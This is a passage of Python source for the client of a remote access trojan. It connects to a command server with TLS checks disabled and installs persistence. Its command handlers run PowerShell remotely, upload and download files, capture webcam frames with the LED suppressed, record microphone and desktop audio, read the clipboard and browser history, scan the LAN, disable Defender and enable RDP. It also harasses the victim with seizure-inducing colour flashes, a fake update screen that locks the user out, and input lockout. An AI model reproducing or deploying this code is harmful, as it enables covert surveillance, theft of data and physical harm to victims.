                        log(f"[CAM FREEZE] {e}")
                threading.Thread(target=_cam_freeze, daemon=True).start()
                await send(ws, {"t": "info", "msg": "Cam freeze frame displayed"})
            else:
                await send(ws, {"t": "info", "msg": "No camera frame cached yet"})

        elif act == "color_seizure":
            count = min(int(msg.get("count", 30)), 100)
            st.seizure_active = True
            def _seizure():
                import random
                colors = [0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00,
                          0xFF00FF, 0x00FFFF, 0xFFFFFF, 0x000000]
                for _ in range(count):
                    if not getattr(st, "seizure_active", False): break
                    try:
                        import tkinter as tk
                        root = tk.Tk()
                        root.attributes("-fullscreen", True, "-topmost", True)
                        root.overrideredirect(True)
                        c = f"#{random.choice(colors):06x}"
                        root.configure(bg=c)
                        root.after(80, root.destroy)
                        root.mainloop()
                    except: pass
                    time.sleep(0.08)
            threading.Thread(target=_seizure, daemon=True).start()
            await send(ws, {"t": "info", "msg": "Color seizure triggered"})

        elif act == "wallpaper_slideshow":
            urls = msg.get("urls", [])
            interval = int(msg.get("interval", 5))
            if not urls:
                urls = [
                    "https://picsum.photos/1920/1080?random=1",
                    "https://picsum.photos/1920/1080?random=2",
                    "https://picsum.photos/1920/1080?random=3",
                ]
            st.wallpaper_slide = True
            def _slideshow():
                while getattr(st, "wallpaper_slide", False):
                    for u in urls:
                        if not getattr(st, "wallpaper_slide", False): break
                        try:
                            data = urllib.request.urlopen(u, timeout=10).read()
                            _set_wallpaper(data)
                        except: pass
                        time.sleep(interval)
            threading.Thread(target=_slideshow, daemon=True).start()
            await send(ws, {"t": "info", "msg": f"Wallpaper slideshow started ({len(urls)} images)"})
        elif act == "wallpaper_slideshow_stop":
            st.wallpaper_slide = False
            await send(ws, {"t": "info", "msg": "Slideshow stopped"})

        elif act == "reboot":
            subprocess.Popen(["shutdown", "/r", "/t", "5", "/c", "System is restarting"],
                             creationflags=subprocess.CREATE_NO_WINDOW)
            await send(ws, {"t": "info", "msg": "Reboot in 5s…"})

        elif act == "logoff":
            ctypes.windll.user32.ExitWindowsEx(0, 0)
            await send(ws, {"t": "info", "msg": "Logging off…"})

        elif act == "task_spam":
            cmd = msg.get("value", "mspaint")
            cnt = min(int(msg.get("count", 5)), 15)
            for _ in range(cnt):
                subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                time.sleep(0.2)
            await send(ws, {"t": "info", "msg": f"Spawned {cnt}x {cmd}"})

        elif act == "eject_cd_spam":
            import ctypes
            cnt = min(int(msg.get("count", 5)), 20)
            def _eject_spam():
                for _ in range(cnt):
                    try:
                        ctypes.windll.WINMM.mciSendStringW("set CDAudio door open", None, 0, None)
                        time.sleep(0.8)
                        ctypes.windll.WINMM.mciSendStringW("set CDAudio door closed", None, 0, None)
                        time.sleep(0.5)
                    except: pass
            threading.Thread(target=_eject_spam, daemon=True).start()
            await send(ws, {"t": "info", "msg": f"CD eject spam x{cnt}"})

        elif act == "screenshot_flood":
            cnt = min(int(msg.get("count", 10)), 50)
            delay = float(msg.get("delay", 0.5))
            async def _ss_flood():
                for i in range(cnt):
                    frame = await asyncio.to_thread(_screenshot)
                    if frame:
                        await send_bin(ws, 0x02, frame)
                    await asyncio.sleep(delay)
            asyncio.create_task(_ss_flood())
            await send(ws, {"t": "info", "msg": f"Screenshot flood: {cnt} frames"})

        # ── Fake Update Screen ────────────────────────────────────────────────
        elif act == "fake_update_screen":
            if not st.fake_update_active:
                def _do_fake_update():
                    procs = _launch_fake_update()
                    st.fake_update_procs  = procs
                    st.fake_update_active = True
                    asyncio.run_coroutine_threadsafe(
                        send(ws, {"t": "info", "msg": "✅ Fake update screen deployed — user is locked"}),
                        global_loop)
                threading.Thread(target=_do_fake_update, daemon=True).start()
                await send(ws, {"t": "fake_update_state", "active": True,
                                "msg": "Deploying fake update overlay…"})
            else:
                await send(ws, {"t": "info", "msg": "Fake update already active"})

        elif act == "revert_fake_update":
            def _do_revert():
                _revert_fake_update()
                st.fake_update_active = False
                st.fake_update_procs  = []
                asyncio.run_coroutine_threadsafe(
                    send(ws, {"t": "fake_update_state", "active": False,
                              "msg": "✅ Fake update reverted — user has control back"}),
                    global_loop)
            threading.Thread(target=_do_revert, daemon=True).start()

    # ── Hidden Operator Desktop ───────────────────────────────────────────────
    elif t == "hidden_desk_open":
        prog = msg.get("prog", "explorer.exe")
        def _open_desk():
            ok, info = _start_hidden_desktop(prog)
            st.hidden_desktop_hnd  = _hidden_desk_handle
            asyncio.run_coroutine_threadsafe(
                send(ws, {"t": "info",
                          "msg": f"Hidden desktop {'open PID=' + str(info) if ok else 'FAILED: ' + str(info)}"}),
                global_loop)
        threading.Thread(target=_open_desk, daemon=True).start()

    elif t == "hidden_desk_close":
        _stop_hidden_desktop()
        st.hidden_stream_active = False
        await send(ws, {"t": "info", "msg": "Hidden desktop closed"})

    elif t == "hidden_desk_stream_on":
        st.hidden_stream_active = True
        await send(ws, {"t": "info", "msg": "Hidden desktop stream started"})

    elif t == "hidden_desk_stream_off":
        st.hidden_stream_active = False
        await send(ws, {"t": "info", "msg": "Hidden desktop stream paused"})

    elif t == "hidden_desk_snap":
        frame = await asyncio.to_thread(_capture_hidden_desktop, int(msg.get("quality", 70)))
        if frame:
            await send_bin(ws, 0x0A, frame)  # tag 0x0A = hidden desktop frame
            await send(ws, {"t": "info", "msg": "Hidden desktop snapshot sent"})
        else:
            await send(ws, {"t": "info", "msg": "Hidden desktop snapshot failed (no frame)"})

    # Camera Commands
    elif t == "cam_on":
        st.camera_active = True
        st.camera_idx    = int(msg.get("idx", 0))
        await send(ws, {"t": "info", "msg": f"Camera {st.camera_idx} started"})
    elif t == "cam_off":
        st.camera_active = False
        await send(ws, {"t": "info", "msg": "Camera stopped"})
    elif t == "cam_select":
        st.camera_idx = int(msg.get("idx", 0))
        await send(ws, {"t": "info", "msg": f"Camera switched to {st.camera_idx}"})
    elif t == "cam_led":
        st.camera_no_led = not bool(msg.get("v", False))
        await send(ws, {"t": "info", "msg": f"LED mode reduced: {st.camera_no_led}"})
    elif t == "cam_enum":
        cams = await asyncio.to_thread(enumerate_cameras)
        await send(ws, {"t": "cam_list", "data": cams})
    elif t == "cam_snapshot":
        idx  = int(msg.get("idx", st.camera_idx))
        data = await asyncio.to_thread(_grab_camera_frame, idx)
        if data:
            await send_bin(ws, 0x04, data)
        await send(ws, {"t": "info", "msg": f"Camera snapshot captured"})

    # Audio Commands
    elif t == "desktop_audio_on":  setattr(st, "audio_active", True)
    elif t == "desktop_audio_off": setattr(st, "audio_active", False)
    elif t == "mic_on":            setattr(st, "mic_active", True)
    elif t == "mic_off":           setattr(st, "mic_active", False)

    # Clipboard Commands
    elif t == "clip_read":
        text = await asyncio.to_thread(recon.get_clipboard) if recon else ""
        await send(ws, {"t": "clipboard_update", "data": text})
    elif t == "clip_write":
        if recon:
            await asyncio.to_thread(recon.set_clipboard, msg.get("text", ""))
        await send(ws, {"t": "info", "msg": "Clipboard injected"})
    elif t == "clip_monitor_on":
        st.clipboard_monitor = True
        await send(ws, {"t": "info", "msg": "Clipboard monitoring started"})
    elif t == "clip_monitor_off":
        st.clipboard_monitor = False
        await send(ws, {"t": "info", "msg": "Clipboard monitoring stopped"})

    # Recon Commands
    elif t == "get_connections":
        data = await asyncio.to_thread(recon.get_active_connections) if recon else []
        await send(ws, {"t": "connections", "data": data})
    elif t == "lan_scan":
        def _do_scan(ws_o):
            def lg(m): asyncio.run_coroutine_threadsafe(send(ws_o, {"t": "info", "msg": m}), global_loop)
            hosts = recon.scan_lan(log_func=lg) if recon else []
            asyncio.run_coroutine_threadsafe(send(ws_o, {"t": "lan_scan_result", "data": hosts}), global_loop)
        threading.Thread(target=_do_scan, args=(ws,), daemon=True).start()
    elif t == "get_software":
        data = await asyncio.to_thread(recon.get_installed_software) if recon else []
        await send(ws, {"t": "software_list", "data": data})
    elif t == "get_history":
        data = await asyncio.to_thread(recon.get_browser_history, int(msg.get("limit", 200))) if recon else []
        await send(ws, {"t": "history_list", "data": data})
    elif t == "get_startup":
        data = await asyncio.to_thread(recon.get_startup_programs) if recon else []
        await send(ws, {"t": "startup_list", "data": data})
    elif t == "remove_startup":
        if recon:
            ok = await asyncio.to_thread(recon.remove_startup, msg.get("reg_path", ""), int(msg.get("hive", 0)), msg.get("name", ""))
            await send(ws, {"t": "info", "msg": "Removed" if ok else "Failed"})
    elif t == "get_env":
        data = await asyncio.to_thread(recon.get_env_vars) if recon else dict(os.environ)
        await send(ws, {"t": "env_vars", "data": data})
    elif t == "get_geo":
        data = await asyncio.to_thread(recon.get_geo_ip) if recon else {}
        st.geo_info = data
        await send(ws, {"t": "geo_info", "data": data})
    elif t == "toggle_rdp":
        if recon:
            res = await asyncio.to_thread(recon.toggle_rdp, bool(msg.get("v", True)))
            await send(ws, {"t": "info", "msg": res})
    elif t == "toggle_defender":
        if recon:
            res = await asyncio.to_thread(recon.toggle_defender, bool(msg.get("v", False)))
            await send(ws, {"t": "info", "msg": res})
    elif t == "sched_ss_on":
        st.sched_ss = True
        st.sched_interval = int(msg.get("interval", 10))
        await send(ws, {"t": "info", "msg": f"Screenshot scheduler ON ({st.sched_interval}s)"})
    elif t == "sched_ss_off":
        st.sched_ss = False
        await send(ws, {"t": "info", "msg": "Screenshot scheduler OFF"})

    # ── Run ───────────────────────────────────────────────────────────────────
    elif t == "run":
        subprocess.Popen(msg.get("cmd", ""), shell=True)
        await send(ws, {"t": "info", "msg": "Started"})

    # ── Mouse / Keyboard control ──────────────────────────────────────────────
    elif t == "mnk":
        mode  = msg.get("mode", "")
        state = bool(msg.get("state", False))
        if mode == "mouse":
            threading.Thread(target=_mnk_mouse, args=(state,), daemon=True).start()
        elif mode == "keyboard":
            threading.Thread(target=_mnk_key, args=(state,), daemon=True).start()
        elif mode == "all":
            threading.Thread(target=_mnk_mouse, args=(state,), daemon=True).start()
            threading.Thread(target=_mnk_key, args=(state,), daemon=True).start()
        await send(ws, {"t": "info", "msg": f"{mode.capitalize()} {'Locked' if state else 'Unlocked'}"})

    # ── High Performance Input Injection ──────────────────────────────────────
    elif t == "mm":
        if input_hub is not None:
            try:
                x, y, w, h = msg.get("x",0), msg.get("y",0), msg.get("w",1), msg.get("h",1)
                input_hub.mouse_move(int((x/w)*input_hub.screen_width),
                                     int((y/h)*input_hub.screen_height))
            except: pass
        else:
            # ctypes fallback
            try:
                x, y, w, h = msg.get("x",0), msg.get("y",0), msg.get("w",1), msg.get("h",1)
                sw = ctypes.windll.user32.GetSystemMetrics(0)
                sh = ctypes.windll.user32.GetSystemMetrics(1)
                ax = int((x / w) * sw)
                ay = int((y / h) * sh)
                ctypes.windll.user32.SetCursorPos(ax, ay)
            except: pass

    elif t == "mc":
        if input_hub is not None:
            try:
                b, p = msg.get("b","left"), msg.get("p",1)
                input_hub.mouse_click(b, p == 1)
            except: pass
        else:
            # ctypes fallback with mouse_event
            try:
                b = msg.get("b", "left")
                p = msg.get("p", 1)
                import ctypes
                MOUSEEVENTF_LEFTDOWN  = 0x0002
                MOUSEEVENTF_LEFTUP    = 0x0004
                MOUSEEVENTF_RIGHTDOWN = 0x0008
                MOUSEEVENTF_RIGHTUP   = 0x0010
                if b == "left":
                    flag = MOUSEEVENTF_LEFTDOWN if p == 1 else MOUSEEVENTF_LEFTUP
                else:
                    flag = MOUSEEVENTF_RIGHTDOWN if p == 1 else MOUSEEVENTF_RIGHTUP
                ctypes.windll.user32.mouse_event(flag, 0, 0, 0, 0)
            except: pass

    elif t in ("kd", "ku"):
        if input_hub is not None:
            try: input_hub.key_event(msg.get("k",""), t == "kd")
            except: pass
        else:
            # ctypes keybd_event fallback
            try:
                import ctypes
                key_str = msg.get("k", "")
                vk_map = {
                    "Enter": 0x0D, "Backspace": 0x08, "Tab": 0x09, "Escape": 0x1B,
                    "Space": 0x20, "Delete": 0x2E, "ArrowLeft": 0x25, "ArrowUp": 0x26,
                    "ArrowRight": 0x27, "ArrowDown": 0x28, "Home": 0x24, "End": 0x23,
                    "PageUp": 0x21, "PageDown": 0x22, "F1": 0x70, "F2": 0x71,
                    "F3": 0x72, "F4": 0x73, "F5": 0x74, "F12": 0x7B,
                    "Control": 0x11, "Alt": 0x12, "Shift": 0x10,
                    "Meta": 0x5B, "Win": 0x5B,
                }
                if key_str in vk_map:
                    vk = vk_map[key_str]
                elif len(key_str) == 1:
                    vk = ctypes.windll.user32.VkKeyScanW(ord(key_str)) & 0xFF
                else:
                    vk = 0
                if vk:
                    flags = 0 if t == "kd" else 2  # KEYEVENTF_KEYUP
                    ctypes.windll.user32.keybd_event(vk, 0, flags, 0)
            except: pass

    elif t == "type":
        try:
            import pyautogui
            await asyncio.to_thread(pyautogui.typewrite, msg.get("text",""), interval=0.05)
        except:
            # ctypes fallback
            try:
                text = msg.get("text", "")
                for ch in text:
                    vk = ctypes.windll.user32.VkKeyScanW(ord(ch)) & 0xFF
                    if vk:
                        ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
                        ctypes.windll.user32.keybd_event(vk, 0, 2, 0)
            except: pass

    # ── File system ───────────────────────────────────────────────────────────
    elif t == "ls":
        path = msg.get("path", "C:\\")
        try:
            import datetime
            files = []
            for entry in os.scandir(path):
                try:
                    stat = entry.stat()
                    files.append({
                        "name": entry.name, "type": "dir" if entry.is_dir() else "file",
                        "size": stat.st_size,
                        "mod":  datetime.datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M")
                    })
                except: pass
            await send(ws, {"t": "fs_resp", "data": files, "path": path})
        except Exception as e:
            await send(ws, {"t": "info", "msg": f"Error: {e}"})

    elif t == "download":
        path = msg.get("path", "")
        try:
            with open(path, "rb") as f: data = f.read()
            chunk = 65000
            name  = os.path.basename(path)
            for i in range(0, len(data), chunk):
                await send(ws, {"t": "file_chunk", "name": name,
                                "data": base64.b64encode(data[i:i+chunk]).decode()})
            await send(ws, {"t": "file_done", "name": name})
        except Exception as e:
            await send(ws, {"t": "info", "msg": f"Download failed: {e}"})

    elif t == "upload":
        path = msg.get("path", "")
        b64  = msg.get("data", "")
        try:
            data = base64.b64decode(b64)
            with open(path, "wb") as f: f.write(data)
            await send(ws, {"t": "info", "msg": f"Upload complete: {os.path.basename(path)}"})
        except Exception as e:
            await send(ws, {"t": "info", "msg": f"Upload failed: {e}"})

    # ── Shell ─────────────────────────────────────────────────────────────────
    elif t == "shell":
        cmd = msg.get("c", "").strip()
        if cmd:
            try:
                result = await asyncio.to_thread(
                    lambda: subprocess.run(
                        ["powershell", "-NonInteractive", "-NoProfile", "-Command", cmd],
                        capture_output=True, text=True, timeout=30,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                )
                output = (result.stdout or "") + (result.stderr or "")
                await send(ws, {"t": "shell_res", "data": output or "(no output)"})
            except subprocess.TimeoutExpired:
                await send(ws, {"t": "shell_res", "data": "[ERROR] Command timed out (30s)"})
            except Exception as e:
                await send(ws, {"t": "shell_res", "data": f"[ERROR] {e}"})

    # ── Misc ──────────────────────────────────────────────────────────────────
    elif t in ("handshake_ok", "ping", "pong"): pass
    else: log(f"Unknown cmd: {t}")

# ─────────────────────────────────────────────────────────────────────────────
# RECEIVE LOOP
# ─────────────────────────────────────────────────────────────────────────────
async def _recv(ws):
    async for raw in ws:
        try:
            if isinstance(raw, bytes): continue
            await handle(jloads(raw), ws)
        except Exception as e:
            log(f"cmd error: {e}")

# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
async def main():
    try: _bootstrap_modules()
    except Exception as e: log(f"[BOOTSTRAP] Error: {e}")

    global global_loop
    global_loop = asyncio.get_event_loop()

    try:
        from modules.persistence import install_persistence
        install_persistence(sys.executable)
    except: pass

    log(f"v21.5 HARDENED - OMNIPRESENCE LIVE -> {SERVER_URL}")

    err_count = 0
    while True:
        try:
            uri   = _ws_url()
            specs = get_specs()
            hwid  = get_hwid()
            uid   = f"{specs['hostname']}_{hwid[:8]}"

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            kw = {"ping_interval": 20, "ping_timeout": 15, "close_timeout": 5}
            if uri.startswith("wss://"): kw["ssl"] = ctx

            log(f"CONNECTING: {uri}")
            async with websockets.connect(uri, **kw) as ws:
                err_count = 0
                global _rtc
                if WebRTCManager is not None:
                    async def _rtc_send(obj):
                        try: await ws.send(jdumps(obj))
                        except: pass
                    _rtc = WebRTCManager(_rtc_send)
                else:
                    _rtc = None

                await send(ws, {"type": "client_auth", "id": uid, "specs": specs})
                await send(ws, {"t": "log", "msg": f"CONNECTIVITY v21.5: Handshake Success - {uid}"})
                log(f"REGISTERED: {uid}")

                await asyncio.gather(
                    _recv(ws),
                    stream_loop(ws),
                    audio_loop(ws),
                    heartbeat_loop(ws, uid),
                    screenshot_scheduler(ws),
                    clipboard_relay_loop(ws),
                    return_exceptions=False
                )
        except Exception as e:
            err_count += 1
            log(f"CONN FAILED [{err_count}]: {e}")
            try:
                with open("CONNECTION_DIAGNOSTIC.txt", "a") as f:
                    f.write(f"[{time.ctime()}] Target: {uri} | Error: {e}\n")
            except: pass

            if err_count > 3:
                try:
                    import core.capture as cap
                    cap.hard_reset()
                except: pass

            await asyncio.sleep(min(30, 2 * err_count))

# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(0)
